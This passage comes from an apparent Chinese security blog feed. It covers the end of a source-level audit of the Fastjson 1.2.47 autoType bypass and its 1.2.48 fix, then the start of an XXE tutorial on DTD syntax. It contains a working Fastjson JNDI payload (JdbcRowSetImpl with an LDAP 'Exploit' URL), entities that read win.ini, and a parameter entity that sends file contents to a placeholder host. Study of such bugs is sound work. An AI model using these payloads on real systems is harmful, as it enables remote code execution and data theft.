clazz类型等于InetSocketAddress.class的处理。</span></span><br><span class="line">      <span class="comment">//我们需要的clazz必须为Class.class，不进入</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == InetSocketAddress.class) &#123;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object objVal;</span><br><span class="line"><span class="comment">//3. 下面这段赋值objVal这个值</span></span><br><span class="line">      <span class="comment">//此处这个大的if对于parser.resolveStatus这个值进行了判断，我们在稍后进行分析这个是啥意思</span></span><br><span class="line">      <span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值为TypeNameRedirect</span></span><br><span class="line">          parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">          parser.accept(JSONToken.COMMA);</span><br><span class="line"><span class="comment">//lexer为json串的下一处解析点的相关数据</span></span><br><span class="line">           <span class="comment">//如果下一处的类型为string</span></span><br><span class="line">          <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">              <span class="comment">//判断解析的下一处的值是否为val，如果不是val，报错退出</span></span><br><span class="line">              <span class="keyword">if</span> (!<span class="string">"val"</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">//移动lexer到下一个解析点</span></span><br><span class="line">              <span class="comment">//举例："val":(移动到此处-&gt;)"xxx"</span></span><br><span class="line">              lexer.nextToken();</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.COLON);</span><br><span class="line"><span class="comment">//此处获取下一个解析点的值"xxx"赋值到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">          parser.accept(JSONToken.RBRACE);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//当parser.resolveStatus的值不为TypeNameRedirect</span></span><br><span class="line">          <span class="comment">//直接解析下一个解析点到objVal</span></span><br><span class="line">          objVal = parser.parse();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      String strVal;</span><br><span class="line"><span class="comment">//2. 可以看到strVal是由objVal赋值，继续往上看</span></span><br><span class="line">      <span class="keyword">if</span> (objVal == <span class="keyword">null</span>) &#123;</span><br><span class="line">          strVal = <span class="keyword">null</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">          strVal = (String) objVal;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//不必进入的分支</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (strVal == <span class="keyword">null</span> || strVal.length() == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//省略诸多对于clazz类型判定的不同分支。</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//1. 可以得知，我们的clazz必须为Class.class类型</span></span><br><span class="line">      <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">      <span class="comment">//我们由这里进来的loadCLass</span></span><br><span class="line">          <span class="comment">//strVal是我们想要可控的一个关键的值，我们需要它是一个恶意类名。往上看看能不能得到一个恶意类名。</span></span><br><span class="line">          <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>那么经过分析，我们可以得到的关注点又跑到<code>parser.resolveStatus</code>这上面来了</p><ol><li><p>当<code>parser.resolveStatus == TypeNameRedirect</code> 我们需要json串中有一个<strong>“val”:”恶意类名”</strong>，来进入if语句的true中，污染objVal，再进一步污染strVal。我们又需要<strong>clazz为class类</strong>来满足if判断条件进入loadClass。</p><p>所以一个json串的格式大概为<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;恶意类名&quot;</code> 这样一个东西，大概如此。</p></li><li><p>当<code>parser.resolveStatus ！= TypeNameRedirect</code>进入if判断的false中，可以直接污染objVal。再加上<strong>clazz=class类</strong></p><p>大概需要一个json串如下:<code>&quot;@type&quot;=&quot;java.lang.Class&quot;,&quot;恶意类名&quot;</code>。</p></li></ol><p>至于哪里调用了<code>MiscCodec.java#deserialze</code>，查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)-384行</code></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yzmow5j315a0d875h.jpg" alt="DefaultJSONParser-384.png"></p><h4 id="定向砸payload"><a href="#定向砸payload" class="headerlink" title="定向砸payload"></a>定向砸payload</h4><p>那么在得到如上信息中，我们就不必一直大海摸虾。之前拿到了两个分支paylaod，拿一个可能的paylaod，试试水看看能不能往TypeUtils.getClassFromMapping(typeName）里面的mapping污染我们的恶意类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line"><span class="string">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先是日常进入解析主要函数<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p>这里有我们的三个在乎的点，如下顺序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> </span>&#123;</span><br><span class="line">   ...  </span><br><span class="line">   <span class="comment">//先是checkAutoType这个万恶的过滤函数</span></span><br><span class="line">   clazz = config.checkAutoType(typeName, <span class="keyword">null</span>, lexer.getFeatures());</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">//ResolveStatus的赋值</span></span><br><span class="line">   <span class="keyword">this</span>.setResolveStatus(TypeNameRedirect);</span><br><span class="line">   <span class="comment">//污染TypeUtils.getClassFromMapping的触发处</span></span><br><span class="line">   Object obj = deserializer.deserialze(<span class="keyword">this</span>, clazz, fieldName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, int)</code>这个分析过了。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yrwgg9j31du0gnabi.jpg" alt="class-go1.png"></p><p>从<code>deserializers.findClass(typeName)</code>出去，这是我们之前分析过的一处可以绕过白名单黑名单出去的地方，但是这里只存放一些默认类，不可污染。而我们的class.class就在这个默认类列表中，自然直接出去了。（比如class.class怎么也不会匹配到黑名单，不这里出去，也是可以下面出去的）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1ylwm5kj31ms163q9k.jpg" alt="class-go2png.png"></p><p>再是，给ResolveStatus赋值了TypeNameRedirect，这样到deserialze里面就可以确定了分支，与预计吻合。这个payload砸的没错。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1yfjv3dj31px0c60ud.jpg" alt="class-go3.png"></p><p>可以发现进入了我们预计希望进入的<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>，可以看到上面有复杂的if判断，这就是得到初步的思路之后砸payload的好处，如果满足条件，我们就不用费力气去想这些是为啥的，反正默认进来了，不满足我们再去看哪里不符合就行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y8ah44j315c12vn1i.jpg" alt="class-go4.png"></p><p>一切按照计划进行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1y0ztirj30w706uwew.jpg" alt="class-go5.png"></p><p>由于objVal是一个String，继续赋值给strVal</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xtd6q3j30z404qjri.jpg" alt="class-go6.png"></p><p>跳跳跳，我们之前由checkAutoType得到的clazz为Class.class，进入loadCLass</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1xjwj9qj312r03tgls.jpg" alt="class-go7.png"></p><p>默认cache为true，之前分析的时候也说到cache为true对我们来说是个好消息。接下来会有三种情况可以污染我们的关键mapping。看看会进入哪一个</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1x8rjbbj31ce0zh77r.jpg" alt="class-go8.png"></p><p>下一个</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wztxobj31gy12lq8g.jpg" alt="class-go9.png"></p><p>第二个if中，帮我们加载了一个classloader，再因为上一层的cache默认为true，就真的执行成功了<code>mappings.put</code>放入了我们的恶意类名！</p><p>完美穿针引线，一环扣一环，往mappings中加入了我们的恶意类。这就是大黑阔嘛，爱了爱了。</p><blockquote><p>现在回头来看这个mapping看到现在，就是放入一些已经加载过了的类，在checkAutoType中就不进行检查来提高速度。</p></blockquote><p>来一个调用栈：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1wnadlyj30pi0brta3.jpg" alt="1.2.47-调用栈.png"></p><p>那么获取一个有恶意类的类似缓存机制的mapping有啥用呢。再进一步@type就好。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1w1dpcnj31om1057e4.jpg" alt="1.2.47-success.png"></p><p>之前看到其他博客说，一开始payload是分成两截，因为服务器的mappings自从加过恶意类之后，就会一直保持，然后就可以随便打了。</p><p>但是之后为了不让负载均衡，平摊payload造成有几率失败，就变成了以下一个。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"java.lang.Class"</span>, </span><br><span class="line">        <span class="attr">"val"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">"b"</span>: &#123;</span><br><span class="line">        <span class="attr">"@type"</span>: <span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>, </span><br><span class="line">        <span class="attr">"dataSourceName"</span>: <span class="string">"ldap://localhost:1389/Exploit"</span>, </span><br><span class="line">        <span class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计结束完美。</p><blockquote><p>回顾一下进来的过程：</p><p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p><ol><li>checkAutoType方法拿到Class.class</li><li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li><li>进入deserializer.deserialze</li></ol><p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p><ol><li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li><li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li><li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li></ol><p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p><ol><li>添加默认cache为true，调用loadClass</li></ol><p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p><ol><li>三个改变mappings的第一处，由于classLoader=null，不进入</li><li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li></ol></blockquote><h3 id="1-2-48修复"><a href="#1-2-48修复" class="headerlink" title="1.2.48修复"></a>1.2.48修复</h3><p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1vmjmw2j32bc0lhacn.jpg" alt="1.2.48修复.png"></p><p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p><p>现在这边直接指定过来三个参数loadClass同时cache为false。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1v926igj31ok0b20ub.jpg" alt="1.2.48try.png"></p><p>可见，在同样payload执行时，我们原来说会改变mappings的第二处就因为cache而无法改变。</p><p>但是我们还记得之前分析时有第三处不需要校验cache的mappings赋值！精神一振，这就是0day的气息么！</p><p>然后…….</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1utn1i5j327q0n2mzu.jpg" alt="1.2.48修复2.png"></p><p>这就是程序员的力量么，两行代码秒杀一切，爱了爱了，0day再见。</p><h3 id="1-2-48以后"><a href="#1-2-48以后" class="headerlink" title="1.2.48以后"></a>1.2.48以后</h3><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p><p>之后又出了一个影响广泛的拒绝服务漏洞，在1.2.60版本被修复。</p><p>当然这与反序列化就无关了，同时这篇文章也写得太久，太长了。也算是给2019做个结尾吧。</p><p>所以，</p><p>2020年，新年快乐。</p><p>要不 下场雪吧？</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">l1nk3r大佬</a></p><p><a href="https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p><p><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></p><p><a href="https://b1ue.cn/archives/184.html" target="_blank" rel="noopener">https://b1ue.cn/archives/184.html</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p><a href="https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/</a></p><p><a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a></p><p><a href="http://wp.blkstone.me/2018/10/fastjson-serial-1/" target="_blank" rel="noopener">http://wp.blkstone.me/2018/10/fastjson-serial-1/</a></p><p><a href="https://blog.csdn.net/kingmax54212008/article/details/95641681" target="_blank" rel="noopener">https://blog.csdn.net/kingmax54212008/article/details/95641681</a></p><p><a href="https://github.com/alibaba/fastjson/tree/1.2.47" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/tree/1.2.47</a></p><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p><p><a href="https://www.freebuf.com/column/180711.html" target="_blank" rel="noopener">https://www.freebuf.com/column/180711.html</a></p><p><a href="https://github.com/jas502n/fastjson-RCE" target="_blank" rel="noopener">https://github.com/jas502n/fastjson-RCE</a></p><p>可能还看了很多。。但是真的回头找不到了，向网上老哥们致敬 (^^ゞ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;推荐阅读时间：60min&lt;br&gt;全文字数：14026&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>WEB-XXE</title>
    <link href="http://lalajun.com/2019/12/03/WEB-XXE/"/>
    <id>http://lalajun.com/2019/12/03/WEB-XXE/</id>
    <published>2019-12-03T09:05:33.000Z</published>
    <updated>2019-12-30T02:55:40.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近先知上看了篇XXE总结的文章，内容不错。整理了一下以前做的笔记复习一下，合成一篇来水一篇。</p><p>XML这东西payload感觉还是忘得很快呀，也是方便自己之后回顾吧。</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行，已知的最终效果就是读取系统文件或DOS攻击。</p><p>理解XXE，其实就是学习XML。</p><h2 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h2><p>XML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式<br>DTD(Document Type Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素。</p><p>可以参考官方的<a href="https://www.ibm.com/developerworks/cn/xml/x-entities/#l6" target="_blank" rel="noopener">xml基础教程</a></p><h3 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h3><p>XML总体是由<code>元素</code>（如<code>&lt;message&gt;</code>）组成。<br>元素可以额外附加<code>属性</code>，需要提前定义。<br>元素中可以引用<code>实体</code>，相当于变量，存在内置变量和自定义变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内置变量 --&gt;</span></span><br><span class="line">&amp;lt;<span class="tag">&lt;</span></span><br><span class="line"><span class="tag">&amp;<span class="attr">gt</span>;&gt;</span></span><br><span class="line">&amp;amp;&amp;</span><br><span class="line">&amp;quot;"</span><br><span class="line">&amp;apos;'</span><br></pre></td></tr></table></figure></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span> &amp;a; <span class="tag">&lt;/<span class="name">square</span>&gt;</span></span><br><span class="line">  元素    属性         实体</span><br></pre></td></tr></table></figure><h3 id="DTD内部文档声明"><a href="#DTD内部文档声明" class="headerlink" title="DTD内部文档声明"></a>DTD内部文档声明</h3><p>当DTD存在于XML源文件中，由以下格式进行包裹<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br>然后XML文件对于DTD的内容进行引用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [ </span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT to      (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT from    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT body    (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>可以看到在DTD设置了一些变量，然后在xml文档中再使用到这些变量。这就是DTD与XML之间的使用方法。</p></blockquote><h3 id="DTD外部文档声明"><a href="#DTD外部文档声明" class="headerlink" title="DTD外部文档声明"></a>DTD外部文档声明</h3><p>从xml文件外部引入DTD：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>note.dtd</code>:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h2><p>DTD中可以</p><ul><li>声明<strong>元素</strong>（标签）：<code>&lt;!ELEMENT...</code> </li><li>为元素声明<strong>属性</strong>（标签属性）：<code>&lt;!ATTLIST...</code></li><li>声明<strong>实体</strong>：<code>&lt;!ENTITY...</code></li></ul><h3 id="DTD声明元素"><a href="#DTD声明元素" class="headerlink" title="DTD声明元素"></a>DTD声明元素</h3><ul><li><code>&lt;!ELEMENT 元素名称 类别&gt;</code><ul><li>类别：EMPTY,(#PCDATA),(#CDDATA),ANY<ul><li>PCDATA：会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</li><li>CDDATA：不会被解析器解析的文本</li></ul></li></ul></li><li><code>&lt;!ELEMENT 元素名称 (元素内容)&gt;</code><ul><li>多个元素内容：(子元素名称 1,子元素名称 2,…..)</li><li>元素内容次数：默认只出现一次。<ul><li>最少出现一个：(子元素名称+)</li><li>出现0次或多次：(子元素名称*)</li><li>出现0次或1次：(子元素名称?)</li><li>或：(message|body)</li></ul></li></ul></li><li>混合类别和元素内容：<ul><li>&lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt;</li></ul></li></ul><h3 id="DTD声明属性"><a href="#DTD声明属性" class="headerlink" title="DTD声明属性"></a>DTD声明属性</h3><p><code>&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></p><ul><li>属性：<ul><li>CDATA    值为字符数据 (character data)</li><li>(en1|en2|..)    此值是枚举列表中的一个值</li><li>ID    值为唯一的 id</li><li>IDREF    值为另外一个元素的 id</li><li>IDREFS    值为其他 id 的列表</li><li>NMTOKEN    值为合法的 XML 名称</li><li>NMTOKENS    值为合法的 XML 名称的列表</li><li>ENTITY    值是一个实体</li><li>ENTITIES    值是一个实体列表</li><li>NOTATION    此值是符号的名称</li><li>xml:    值是一个**预定义的 XML 值</li></ul></li><li>默认值：<ul><li>值    属性的默认值</li><li>#REQUIRED    属性值是必需的</li><li>#IMPLIED    属性不是必需的</li><li>#FIXED value    属性值是固定的</li></ul></li></ul><p>DTD声明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="DTD声明实体"><a href="#DTD声明实体" class="headerlink" title="DTD声明实体"></a>DTD声明实体</h3><p>命名实体(内部实体)：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>外部实体：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code><br>参数实体：<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code>（只在DTD中有效）<br>外部参数实体：<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code>（只在DTD中有效）</p><blockquote><p>声明外部实体/命名实体时，指定实体的名称及其替代文本。替代文本可以包含字符实体、命名实体和元素等，但不包含参数实体。</p></blockquote><p>DTD声明：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Bill</span> <span class="attr">Gates</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">W3School.com.cn</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>//<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>?%<span class="attr">other_file</span>;"&gt;</span></span><br></pre></td></tr></table></figure></p><p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>参数实体DTD中使用：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://x.x.x.x/xxe.xml?c=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="XXE分类"><a href="#XXE分类" class="headerlink" title="XXE分类"></a>XXE分类</h2><ol><li>经典XXE：外部实体可以引入</li><li>XXE盲注：没有回显或错误信息</li><li>报错XXE：通过报错信息获取</li><li>DOS攻击：用于不断循环实体变量，导致内存爆炸。</li></ol><h2 id="常用攻击payload"><a href="#常用攻击payload" class="headerlink" title="常用攻击payload"></a>常用攻击payload</h2><h3 id="0x01-经典XXE"><a href="#0x01-经典XXE" class="headerlink" title="0x01.经典XXE"></a>0x01.经典XXE</h3><p>使用<strong>外部实体</strong>进行文件读取。<br>条件：</p><ol><li>可以引用外部实体</li><li>服务器要回显结果</li></ol><figure class="highlight xml"><table><tr><td 